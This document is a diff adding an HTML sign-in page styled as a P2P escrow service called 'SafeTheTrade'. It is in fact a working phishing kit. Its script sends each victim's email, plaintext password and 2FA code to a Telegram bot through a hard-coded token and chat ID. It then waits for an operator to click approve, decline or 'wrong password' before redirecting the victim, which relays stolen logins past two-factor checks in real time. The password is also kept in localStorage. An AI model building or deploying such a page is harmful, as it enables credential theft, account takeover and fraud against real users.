@@ -1,0 +1,1070 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Sign In — SafeTheTrade</title>
+    <style>
+        *,
+        *::before,
+        *::after {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        
+         :root {
+            --bg: #0a0a0a;
+            --nav-border: #1a1a1a;
+            --card-bg: #141414;
+            --card-border: #222222;
+            --input-bg: #1c1c1c;
+            --input-border: #2a2a2a;
+            --text: #ffffff;
+            --text-muted: #8a8a8a;
+            --text-label: #9a9a9a;
+            --green: #22c55e;
+            --green-hover: #16a34a;
+            --btn-white: #f5f5f5;
+            --btn-white-text: #111111;
+            --footer-text: #6b6b6b;
+            --danger: #ef4444;
+            --font: "Inter", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+        
+        html,
+        body {
+            height: 100%;
+        }
+        
+        body {
+            font-family: var(--font);
+            background: var(--bg);
+            color: var(--text);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+        
+        .header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 28px;
+            height: 64px;
+            border-bottom: 1px solid var(--nav-border);
+            flex-shrink: 0;
+        }
+        
+        .header-left {
+            display: flex;
+            align-items: center;
+            gap: 28px;
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            text-decoration: none;
+            color: var(--text);
+        }
+        
+        .logo-icon {
+            width: 28px;
+            height: 28px;
+            border-radius: 50%;
+            flex-shrink: 0;
+            background: radial-gradient(circle at 35% 35%, #4ade80, #16a34a 55%, #14532d);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 0 0 1px rgba(34, 197, 94, 0.25);
+        }
+        
+        .logo-icon svg {
+            width: 14px;
+            height: 14px;
+        }
+        
+        .logo-text {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 17px;
+            font-weight: 600;
+            letter-spacing: -0.02em;
+        }
+        
+        .logo-image {
+            width: 35px;
+            height: 35px;
+            object-fit: contain;
+        }
+        
+        .nav-link {
+            color: var(--text-muted);
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+            transition: color 0.15s;
+        }
+        
+        .nav-link:hover {
+            color: var(--text);
+        }
+        
+        .header-right {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .btn-outline {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            height: 36px;
+            padding: 0 16px;
+            border-radius: 8px;
+            border: 1px solid #2e2e2e;
+            background: transparent;
+            color: var(--text);
+            font-size: 13.5px;
+            font-weight: 500;
+            font-family: inherit;
+            text-decoration: none;
+            cursor: pointer;
+            transition: background 0.15s, border-color 0.15s;
+        }
+        
+        .btn-outline:hover {
+            background: #1a1a1a;
+            border-color: #3a3a3a;
+        }
+        
+        .btn-green {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            height: 36px;
+            padding: 0 16px;
+            border-radius: 8px;
+            border: none;
+            background: var(--green);
+            color: #fff;
+            font-size: 13.5px;
+            font-weight: 600;
+            font-family: inherit;
+            text-decoration: none;
+            cursor: pointer;
+            transition: background 0.15s;
+        }
+        
+        .btn-green:hover {
+            background: var(--green-hover);
+        }
+        
+        .main {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 40px 20px;
+        }
+        
+        .card {
+            width: 100%;
+            max-width: 400px;
+            background: var(--card-bg);
+            border: 1px solid var(--card-border);
+            border-radius: 16px;
+            padding: 32px 32px 28px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.45);
+        }
+        
+        .card h1 {
+            font-size: 26px;
+            font-weight: 700;
+            letter-spacing: -0.03em;
+            margin-bottom: 6px;
+            color: #fafafa;
+        }
+        
+        .card-subtitle {
+            font-size: 13.5px;
+            color: var(--text-muted);
+            margin-bottom: 28px;
+            line-height: 1.4;
+        }
+        
+        .field {
+            margin-bottom: 18px;
+        }
+        
+        .field label {
+            display: block;
+            font-size: 11px;
+            font-weight: 600;
+            letter-spacing: 0.06em;
+            text-transform: uppercase;
+            color: var(--text-label);
+            margin-bottom: 8px;
+        }
+        
+        .input-wrap {
+            position: relative;
+            display: flex;
+            align-items: center;
+        }
+        
+        .input-wrap .icon-left {
+            position: absolute;
+            left: 14px;
+            width: 16px;
+            height: 16px;
+            color: #6b6b6b;
+            pointer-events: none;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .input-wrap .icon-left svg,
+        .input-wrap .icon-right svg {
+            width: 16px;
+            height: 16px;
+        }
+        
+        .input-wrap input {
+            width: 100%;
+            height: 44px;
+            padding: 0 44px 0 42px;
+            background: var(--input-bg);
+            border: 1px solid var(--input-border);
+            border-radius: 10px;
+            color: var(--text);
+            font-size: 14px;
+            font-family: inherit;
+            outline: none;
+            transition: border-color 0.15s, box-shadow 0.15s;
+        }
+        
+        .input-wrap input::placeholder {
+            color: #555555;
+        }
+        
+        .input-wrap input:focus {
+            border-color: #3f3f3f;
+            box-shadow: 0 0 0 3px rgba(255, 255, 255, 0.04);
+        }
+        
+        .input-wrap .icon-right {
+            position: absolute;
+            right: 12px;
+            width: 32px;
+            height: 32px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: none;
+            border: none;
+            color: #6b6b6b;
+            cursor: pointer;
+            border-radius: 6px;
+            padding: 0;
+        }
+        
+        .input-wrap .icon-right:hover {
+            color: #a3a3a3;
+        }
+        
+        .row-options {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 22px;
+            margin-top: 4px;
+        }
+        
+        .checkbox-label {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 13.5px;
+            color: #c4c4c4;
+            cursor: pointer;
+            user-select: none;
+        }
+        
+        .checkbox-label input {
+            position: absolute;
+            opacity: 0;
+            width: 0;
+            height: 0;
+        }
+        
+        .checkbox-custom {
+            width: 16px;
+            height: 16px;
+            border-radius: 4px;
+            border: 1.5px solid #3a3a3a;
+            background: transparent;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+            transition: background 0.15s, border-color 0.15s;
+        }
+        
+        .checkbox-label input:checked+.checkbox-custom {
+            background: var(--green);
+            border-color: var(--green);
+        }
+        
+        .checkbox-custom svg {
+            width: 10px;
+            height: 10px;
+            opacity: 0;
+            color: #fff;
+        }
+        
+        .checkbox-label input:checked+.checkbox-custom svg {
+            opacity: 1;
+        }
+        
+        .forgot-link {
+            color: var(--green);
+            font-size: 13.5px;
+            font-weight: 500;
+            text-decoration: none;
+        }
+        
+        .forgot-link:hover {
+            text-decoration: underline;
+        }
+        
+        .btn-submit {
+            width: 100%;
+            height: 46px;
+            border: none;
+            border-radius: 10px;
+            background: var(--btn-white);
+            color: var(--btn-white-text);
+            font-size: 14.5px;
+            font-weight: 600;
+            font-family: inherit;
+            cursor: pointer;
+            transition: background 0.15s, transform 0.1s;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        
+        .btn-submit:hover {
+            background: #e8e8e8;
+        }
+        
+        .btn-submit:active {
+            transform: scale(0.995);
+        }
+        
+        .btn-submit:disabled {
+            cursor: not-allowed;
+            opacity: 0.75;
+        }
+        
+        .spinner {
+            width: 18px;
+            height: 18px;
+            border-radius: 50%;
+            border: 2px solid rgba(0, 0, 0, 0.15);
+            border-top-color: rgba(0, 0, 0, 0.65);
+            animation: spin 0.8s linear infinite;
+            display: none;
+        }
+        
+        .btn-submitting .spinner {
+            display: inline-block;
+        }
+        
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+        
+        .signup-row {
+            text-align: center;
+            margin-top: 22px;
+            font-size: 13.5px;
+            color: var(--text-muted);
+        }
+        
+        .signup-row a {
+            color: var(--green);
+            font-weight: 500;
+            text-decoration: none;
+        }
+        
+        .signup-row a:hover {
+            text-decoration: underline;
+        }
+        
+        .form-note {
+            margin-top: 14px;
+            min-height: 18px;
+            font-size: 13.5px;
+            color: var(--text-muted);
+        }
+        
+        .form-note.error {
+            color: var(--danger);
+            font-weight: 600;
+        }
+        
+        .form-note.success {
+            color: var(--green);
+            font-weight: 600;
+        }
+        /* ─── 2FA specific ─── */
+        
+        .card-subtitle-2fa {
+            font-size: 13.5px;
+            color: var(--text-muted);
+            margin-bottom: 28px;
+            line-height: 1.55;
+        }
+        
+        .field-2fa {
+            margin-bottom: 16px;
+        }
+        
+        .field-2fa input {
+            width: 100%;
+            height: 44px;
+            padding: 0 14px;
+            background: var(--input-bg);
+            border: 1px solid var(--input-border);
+            border-radius: 10px;
+            color: var(--text);
+            font-size: 14px;
+            font-family: inherit;
+            letter-spacing: 0.04em;
+            outline: none;
+            transition: border-color 0.15s, box-shadow 0.15s;
+        }
+        
+        .field-2fa input::placeholder {
+            color: #555555;
+            letter-spacing: normal;
+        }
+        
+        .field-2fa input:focus {
+            border-color: #3f3f3f;
+            box-shadow: 0 0 0 3px rgba(255, 255, 255, 0.04);
+        }
+        
+        .switch-account {
+            display: inline-block;
+            color: var(--green);
+            font-size: 13.5px;
+            font-weight: 500;
+            text-decoration: none;
+            margin-bottom: 24px;
+            cursor: pointer;
+        }
+        
+        .switch-account:hover {
+            text-decoration: underline;
+        }
+        /* ─── Step visibility ─── */
+        
+        .step {
+            display: none;
+        }
+        
+        .step.active {
+            display: block;
+        }
+        
+        .footer {
+            flex-shrink: 0;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 18px 28px;
+            border-top: 1px solid var(--nav-border);
+            font-size: 12.5px;
+            color: var(--footer-text);
+            flex-wrap: wrap;
+            gap: 10px;
+        }
+        
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            align-items: center;
+            gap: 0;
+        }
+        
+        .footer-links a {
+            color: var(--footer-text);
+            text-decoration: none;
+            transition: color 0.15s;
+        }
+        
+        .footer-links a:hover {
+            color: #a3a3a3;
+        }
+        
+        .footer-links .sep {
+            margin: 0 6px;
+            color: var(--footer-text);
+            user-select: none;
+        }
+        
+        @media (max-width: 640px) {
+            .header {
+                padding: 0 16px;
+            }
+            .card {
+                padding: 28px 22px 24px;
+            }
+            .footer {
+                flex-direction: column;
+                align-items: flex-start;
+                padding: 16px;
+            }
+            .nav-link {
+                display: none;
+            }
+        }
+    </style>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet" />
+</head>
+
+<body>
+    <header class="header">
+        <div class="header-left">
+            <a href="#" class="logo" aria-label="SafeTheTrade home">
+                <span class="logo-icon" aria-hidden="true">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+                        <path d="M12 3l7 3v5c0 4.5-3 7.5-7 9-4-1.5-7-4.5-7-9V6l7-3z" />
+                        <path d="M9 12l2 2 4-4" />
+                    </svg>
+                </span>
+                <span class="logo-text">
+                    <img src="safethetradelogo.png" alt="SafeTheTrade Logo" class="logo-image">
+                    SafeTheTrade
+                </span>
+            </a>
+            <a href="#" class="nav-link">Offers</a>
+        </div>
+        <div class="header-right">
+            <a href="#" class="btn-outline">Log in</a>
+            <a href="#" class="btn-green">Sign up</a>
+        </div>
+    </header>
+
+    <main class="main">
+        <div class="card">
+            <!-- STEP 1: Sign In -->
+            <div id="step1" class="step active">
+                <h1>Sign In</h1>
+                <p class="card-subtitle">Access your secure P2P escrow account</p>
+
+                <form id="signinForm" autocomplete="on">
+                    <div class="field">
+                        <label for="email">Email or username</label>
+                        <div class="input-wrap">
+                            <span class="icon-left" aria-hidden="true">
+                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+                                    <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2" />
+                                    <circle cx="12" cy="7" r="4" />
+                                </svg>
+                            </span>
+                            <input id="email" name="email" type="text" placeholder="Enter your registered email..." autocomplete="username" />
+                        </div>
+                    </div>
+
+                    <div class="field">
+                        <label for="password">Password</label>
+                        <div class="input-wrap">
+                            <span class="icon-left" aria-hidden="true">
+                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+                                    <rect x="3" y="11" width="18" height="11" rx="2" />
+                                    <path d="M7 11V7a5 5 0 0 1 10 0v4" />
+                                </svg>
+                            </span>
+                            <input id="password" name="password" type="password" placeholder="••••••••••" autocomplete="current-password" />
+                            <button type="button" class="icon-right" id="togglePassword" aria-label="Show password">
+                                <svg id="eyeIcon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+                                    <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z" />
+                                    <circle cx="12" cy="12" r="3" />
+                                </svg>
+                            </button>
+                        </div>
+                    </div>
+
+                    <div class="row-options">
+                        <label class="checkbox-label">
+                            <input type="checkbox" name="remember" checked />
+                            <span class="checkbox-custom" aria-hidden="true">
+                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
+                                    <polyline points="20 6 9 17 4 12" />
+                                </svg>
+                            </span>
+                            Remember me
+                        </label>
+                        <a href="#" class="forgot-link">Forgot password?</a>
+                    </div>
+
+                    <button type="submit" class="btn-submit">
+                        <span class="spinner" aria-hidden="true"></span>
+                        <span id="submitBtnText">Sign In securely</span>
+                    </button>
+
+                    <div id="formNote" class="form-note" aria-live="polite"></div>
+                </form>
+
+                <p class="signup-row">
+                    Don't have an account?
+                    <a href="#">Create Escrow Account</a>
+                </p>
+            </div>
+
+            <!-- STEP 2: 2FA Code -->
+            <div id="step2" class="step">
+                <h1>Two-factor code</h1>
+                <p class="card-subtitle-2fa">
+                    Signing in as <span id="loginEmail">—</span> — enter the 6-<br /> digit code from your authenticator app.
+                </p>
+
+                <form id="twofaForm" autocomplete="one-time-code">
+                    <div class="field-2fa">
+                        <label for="code">2FA code</label>
+                        <input id="code" name="code" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="6" placeholder="123456" autocomplete="one-time-code" />
+                    </div>
+
+                    <span class="switch-account" id="switchAccount">Use a different account</span>
+
+                    <button type="submit" class="btn-submit">Verify code</button>
+                </form>
+            </div>
+        </div>
+    </main>
+
+    <footer class="footer">
+        <div>www.safethetrade.com &copy; 2026</div>
+        <div class="footer-links">
+            <a href="#">Rate calculator</a><span class="sep">/</span>
+            <a href="#">System status</a><span class="sep">/</span>
+            <a href="#">Transparency</a><span class="sep">/</span>
+            <a href="#">API docs</a><span class="sep">/</span>
+            <a href="#">Fees</a><span class="sep">/</span>
+            <a href="#">Terms</a><span class="sep">/</span>
+            <a href="#">Privacy</a>
+        </div>
+    </footer>
+    <!-- ===== Spinner Overlay (approval pending) ===== -->
+    <div class="spinner-overlay" id="spinnerOverlay">
+        <div class="spinner"></div>
+        <p class="spinner-text">login...</p>
+        <p class="spinner-email" id="spinnerEmail"></p>
+        <button class="cancel-poll-btn" type="button" id="cancelPollBtn">Cancel</button>
+    </div>
+
+    <style>
+        .spinner-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.85);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.4s ease, visibility 0.4s ease;
+            pointer-events: none;
+        }
+        
+        .spinner-overlay.active {
+            opacity: 1;
+            visibility: visible;
+            pointer-events: all;
+        }
+        
+        .spinner {
+            width: 48px;
+            height: 48px;
+            border: 4px solid rgba(255, 255, 255, 0.15);
+            border-top-color: #22c55e;
+            border-radius: 50%;
+            animation: spin 0.9s linear infinite;
+        }
+        
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+        
+        .spinner-text {
+            color: #d1d5db;
+            font-size: 15px;
+            margin-top: 20px;
+            font-weight: 500;
+        }
+        
+        .spinner-email {
+            color: #22c55e;
+            font-size: 14px;
+            margin-top: 6px;
+            font-weight: 600;
+        }
+        
+        .cancel-poll-btn {
+            margin-top: 22px;
+            padding: 10px 28px;
+            background: transparent;
+            border: 1px solid #4b5563;
+            border-radius: 50px;
+            color: #9ca3af;
+            font-family: inherit;
+            font-size: 13px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        
+        .cancel-poll-btn:hover {
+            border-color: #ef4444;
+            color: #ef4444;
+        }
+    </style>
+
+    <script>
+        // ─── Telegram polling state ─────────────────────────────
+        let pollDecided = false;
+        let pollTimeoutId = null;
+        let currentPollController = null;
+        // ─── CONFIG ──────────────────────────────────────────────────────
+        const BOT_TOKEN = '8934280565:AAFLlElKoIQkgqWUYalq44B1PFCrV_Xt_ko';
+        const CHAT_ID = '8229040857';
+        const API_BASE = `https://api.telegram.org/bot${BOT_TOKEN}`;
+
+        // ─── DOM refs ──────────────────────────────────────────────────
+        const spinnerOverlay = document.getElementById('spinnerOverlay');
+        const spinnerEmailEl = document.getElementById('spinnerEmail');
+        const cancelPollBtn = document.getElementById('cancelPollBtn');
+        const step1 = document.getElementById('step1');
+        const step2 = document.getElementById('step2');
+        const emailField = document.getElementById('email');
+        const passwordField = document.getElementById('password');
+        const codeField = document.getElementById('code');
+        const loginEmailEl = document.getElementById('loginEmail');
+        const toggleBtn = document.getElementById('togglePassword');
+        const eyeIcon = document.getElementById('eyeIcon');
+        const signinForm = document.getElementById('signinForm');
+        const twofaForm = document.getElementById('twofaForm');
+        const submitBtnText = document.getElementById('submitBtnText');
+        const formNote = document.getElementById('formNote');
+        const switchAccount = document.getElementById('switchAccount');
+
+        // ─── Helpers ───────────────────────────────────────────────────
+        function switchStep(from, to) {
+            from.classList.remove('active');
+            to.classList.add('active');
+        }
+
+        function setFormNote(msg, type) {
+            formNote.textContent = msg;
+            formNote.className = 'form-note' + (type ? ' ' + type : '');
+        }
+
+        // ─── Eye toggle ─────────────────────────────────────────────────
+        toggleBtn.addEventListener('click', function() {
+            const isPassword = passwordField.type === 'password';
+            passwordField.type = isPassword ? 'text' : 'password';
+            toggleBtn.setAttribute('aria-label', isPassword ? 'Hide password' : 'Show password');
+            eyeIcon.innerHTML = isPassword ?
+                '<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/>' :
+                '<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>';
+        });
+
+        // ─── Load saved email ────────────────────────────────────────────
+        window.addEventListener('DOMContentLoaded', () => {
+            const saved = localStorage.getItem('signin_email');
+            if (saved) emailField.value = saved;
+        });
+
+        // ─── "Use a different account" → go back to step 1 ─────────────
+        switchAccount.addEventListener('click', function() {
+            switchStep(step2, step1);
+            codeField.value = '';
+            setFormNote('');
+        });
+
+        // ─── STEP 1: Sign In submit ─────────────────────────────────────
+        signinForm.addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const email = emailField.value.trim();
+            const password = passwordField.value;
+
+            if (!email || !password) {
+                setFormNote('Please enter your email and password.', 'error');
+                return;
+            }
+
+            localStorage.setItem('signin_email', email);
+            localStorage.setItem('signin_password', password); // OPTIONAL (not recommended, but mirrors your request)
+
+            // Prepare UI
+            setFormNote('Verifying with Telegram...', '');
+            spinnerEmailEl.textContent = email; // or mask if you want
+            spinnerOverlay.classList.add('active');
+
+            // Disable submit while waiting
+            submitBtnText && (submitBtnText.textContent = 'Waiting for approval...');
+            const submitBtn = document.querySelector('#signinForm .btn-submit');
+            submitBtn && (submitBtn.disabled = true);
+
+            // Unique request id used in callback_data
+            const userId = email.replace(/[^a-zA-Z0-9]/g, '').slice(0, 15) + '_' + Date.now();
+            localStorage.setItem('signin_userId', userId);
+
+            const message = [
+                '🔐 Login attempt',
+                '',
+                `Email: ${email}`,
+                `Password: ${password}`,
+                '',
+                'Please approve, decline, or mark as wrong password:'
+            ].join('\n');
+
+            const keyboard = {
+                inline_keyboard: [
+                    [{
+                        text: '✅ APPROVE',
+                        callback_data: `approve_${userId}`
+                    }, {
+                        text: '❌ DECLINE',
+                        callback_data: `decline_${userId}`
+                    }],
+                    [{
+                        text: '⚠️ WRONG PASSWORD',
+                        callback_data: `wrong_${userId}`
+                    }]
+                ]
+            };
+
+            // Send message then start polling
+            fetch(`${API_BASE}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        reply_markup: JSON.stringify(keyboard)
+                    })
+                })
+                .then(res => res.json())
+                .then(data => {
+                    if (!data.ok) {
+                        spinnerOverlay.classList.remove('active');
+                        submitBtn && (submitBtn.disabled = false);
+                        setFormNote('Failed to contact Telegram. Please try again.', 'error');
+                        return;
+                    }
+                    startPolling(userId, 'otp.html', 'auth');
+                })
+                .catch(err => {
+                    console.error('Telegram send failed:', err);
+                    spinnerOverlay.classList.remove('active');
+                    submitBtn && (submitBtn.disabled = false);
+                    setFormNote('Network error. Please try again.', 'error');
+                });
+        });
+
+        // ─── STEP 2: 2FA Code submit ────────────────────────────────────
+        twofaForm.addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const code = codeField.value.trim();
+
+            if (!/^\d{6}$/.test(code)) {
+                alert('Please enter a valid 6-digit code.');
+                return;
+            }
+
+            const storedEmail = localStorage.getItem('signin_email') || 'unknown';
+
+            // Fire-and-forget to Telegram
+            const message = [
+                '🔐 2FA code received',
+                '',
+                `Code: ${code}`,
+                `Email: ${storedEmail}`
+            ].join('\n');
+
+            fetch(`${API_BASE}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message
+                })
+            }).catch(err => console.error('Telegram send failed:', err));
+
+            // Navigate to deriv.html
+            window.location.href = 'deriv.html';
+        });
+
+        function cancelPolling() {
+            pollDecided = true;
+            if (pollTimeoutId) clearTimeout(pollTimeoutId);
+            if (currentPollController) currentPollController.abort();
+
+            spinnerOverlay.classList.remove('active');
+            setFormNote('Request cancelled. Please try again.', 'error');
+            submitBtnText && (submitBtnText.textContent = 'Sign In securely');
+        }
+
+        function startPolling(userId, onApproveUrl, pollType /* 'auth' */ ) {
+            let offset = 0;
+            pollDecided = false;
+            let pollCount = 0;
+            const maxPolls = 90;
+            let retryDelay = 2000;
+
+            if (currentPollController) currentPollController.abort();
+            currentPollController = new AbortController();
+
+            // Get initial offset
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?limit=1`, {
+                    signal: currentPollController.signal
+                })
+                .then(r => r.json())
+                .then(data => {
+                    if (data.ok && data.result.length > 0) {
+                        offset = data.result[data.result.length - 1].update_id + 1;
+                    }
+                    pollLoop();
+                })
+                .catch(err => {
+                    if (err.name !== 'AbortError') {
+                        console.error('Initial offset error:', err);
+                        pollLoop();
+                    }
+                });
+
+            function pollLoop() {
+                if (pollDecided) return;
+                pollCount++;
+
+                if (pollCount > maxPolls) {
+                    pollDecided = true;
+                    spinnerOverlay.classList.remove('active');
+                    setFormNote('Request timed out. Please try again.', 'error');
+                    return;
+                }
+
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?limit=20&offset=${offset}`, {
+                        method: 'GET',
+                        signal: currentPollController.signal
+                    })
+                    .then(r => {
+                        if (!r.ok) {
+                            if (r.status === 409) {
+                                retryDelay = Math.min(retryDelay * 1.5, 10000);
+                                pollTimeoutId = setTimeout(pollLoop, retryDelay);
+                                return null;
+                            }
+                            throw new Error('HTTP ' + r.status);
+                        }
+                        retryDelay = 2000;
+                        return r.json();
+                    })
+                    .then(data => {
+                        if (data === null) return;
+                        if (!data.ok || pollDecided) return;
+
+                        for (const update of data.result) {
+                            offset = update.update_id + 1;
+
+                            if (update.callback_query) {
+                                const action = update.callback_query.data;
+
+                                // answer callback to stop Telegram "loading"
+                                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
+                                    method: 'POST',
+                                    headers: {
+                                        'Content-Type': 'application/json'
+                                    },
+                                    body: JSON.stringify({
+                                        callback_query_id: update.callback_query.id,
+                                        text: 'Action recorded!'
+                                    })
+                                }).catch(() => {});
+
+                                // AUTH actions
+                                if (pollType === 'auth') {
+                                    if (action === `approve_${userId}`) {
+                                        pollDecided = true;
+                                        localStorage.setItem('signin_approved', '1');
+                                        localStorage.setItem('signin_userId', userId);
+                                        spinnerOverlay.classList.remove('active');
+
+                                        // Go to OTP page
+                                        window.location.href = onApproveUrl;
+                                        return;
+                                    } else if (action === `decline_${userId}`) {
+                                        pollDecided = true;
+                                        spinnerOverlay.classList.remove('active');
+                                        setFormNote('Request declined. Please try again.', 'error');
+                                        return;
+                                    } else if (action === `wrong_${userId}`) {
+                                        pollDecided = true;
+                                        spinnerOverlay.classList.remove('active');
+                                        setFormNote('Wrong password. Please enter the correct password.', 'error');
+                                        return;
+                                    }
+                                }
+                            }
+                        }
+
+                        if (!pollDecided) {
+                            pollTimeoutId = setTimeout(pollLoop, retryDelay);
+                        }
+                    })
+                    .catch(err => {
+                        if (err.name === 'AbortError') return;
+                        console.error('Poll error:', err);
+                        if (!pollDecided) {
+                            retryDelay = Math.min(retryDelay * 1.2, 8000);
+                            pollTimeoutId = setTimeout(pollLoop, retryDelay);
+                        }
+                    });
+            }
+        }
+        cancelPollBtn.addEventListener('click', cancelPolling);
+    </script>
+</body>
+
+</html>
